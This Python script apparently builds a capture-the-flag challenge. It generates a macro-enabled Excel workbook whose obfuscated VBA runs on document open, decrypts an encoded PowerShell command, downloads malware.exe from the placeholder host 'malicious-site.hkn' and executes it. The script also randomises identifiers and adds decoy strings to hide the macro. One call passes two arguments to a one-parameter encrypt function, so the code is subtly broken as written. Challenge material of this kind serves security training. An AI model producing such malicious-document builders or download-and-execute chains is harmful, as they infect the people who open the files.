from string import ascii_letters
import random
import win32com.client as win32
from base64 import b64encode
import sys


DEBUG = "DEBUG" in sys.argv

FLAG = "DDC{b3_c4r3fu1_wh4t_y0u_0p3n!}"
KEY = "cyb3r"


def encrypt(msg):
    return [ord(c) ^ ord(KEY[i % len(KEY)]) ^ i for i, c in enumerate(msg)]


def obfuscate(code):
    code = code.replace("    ", "").replace("\n\n", "\n")
    code = "\n".join([line for line in code.split("\n") if not line.startswith("Debug")])

    replacements = []
    for line in code.split("\n"):
        tokens = line.split()
        if len(tokens) == 0:
            continue

        if tokens[0] == "Dim":
            replacements.append(tokens[1])
        elif tokens[0] == "Function":
            replacements.append(tokens[1].split("(")[0])
            params = line.replace("(", ",").replace(")", ",").split(",")
            for param in params[1:-1]:
                replacements.append(param.split()[0])

    for to_replace in sorted(replacements, key=len, reverse=True):
        code = code.replace(to_replace, "".join(random.sample(ascii_letters, 10)))
    
    return code


def vba_array_fit(arr):
    result = ", ".join(arr[:150])
    for i in range(1, (len(arr) // 150) + 1):
        result += ", _\n" + ", ".join(arr[150 * i:150 * (i + 1)])
    return result


def gen_chall(vba_code):
    # Generate Excel sheet
    xl = win32.gencache.EnsureDispatch('Excel.Application')
    xl.Visible = True
    workbook = xl.Workbooks.Add()

    # Generate secret-generation module
    xlmodule = workbook.VBProject.VBComponents.Add(1)
    xlmodule.name = "SecretGen"
    secret_code = """Public key As String
Public Sub setKey()
    key = "cyb3r"
End Sub"""
    xlmodule.CodeModule.AddFromString(secret_code)

    # Generate main challenge module
    xlmodule = workbook.VBProject.VBComponents.Add(1)
    xlmodule.name = "FetchMalware"
    xlmodule.CodeModule.AddFromString(vba_code)

    workbook.SaveAs("regnskab.xlsm", FileFormat=52)  # File with macros enabled


vba_script = """Function Decrypt(msg As Variant)
    Dim output As String

    Dim idx
    For idx = 0 To UBound(msg)
        output = output + Chr(msg(idx) Xor Asc(Mid(key, (idx Mod Len(key)) + 1, 1)) Xor idx)
    Next idx
    Dim tmp1
    tmp1 = "LFKhjljdHIQOQo298"
    Decrypt = output
End Function

Private Sub Document_Open()
    Call SecretGen.setKey

    Dim tmp2
    tmp2 = "apiSOIQdslkjQ"

    Dim idx1
    For idx1 = 0 to 32
        If idx1 < 20 Then DoEvents
    Next idx1
    
    Dim enc_ps_cmd
    enc_ps_cmd = Array({})
    Dim ps_cmd
    ps_cmd = Decrypt(enc_ps_cmd)
    Debug.Print ps_cmd
    Dim tmp3
    tmp3 = "ssdljkh9y893AAAZ=="
    Dim RetVal
    RetVal = Shell(ps_cmd, 1)
End Sub"""

ps_script = f"""$file = "malware.exe";
$address = "http://malicious-site.hkn/malware.exe?token={FLAG}"
(New-Object net.webclient).downloadFile($address, $file);
([wmiclass]'win32_Process').Create($file);"""


def main():
    ps_cmd = "powerSheLl "
    if DEBUG:
        ps_cmd += "-NoExit "
    ps_cmd += "-e " + b64encode(ps_script.encode("utf-16-le")).decode()
    enc_ps_cmd = [*map(str, encrypt(ps_cmd, KEY))]
    formatted_cmd = vba_array_fit(enc_ps_cmd)
    
    vba_code = vba_script.format(formatted_cmd)
    if not DEBUG:
        vba_code = obfuscate(vba_code)
    
    print(vba_code)
    gen_chall(vba_code)


if __name__ == "__main__":
    main()
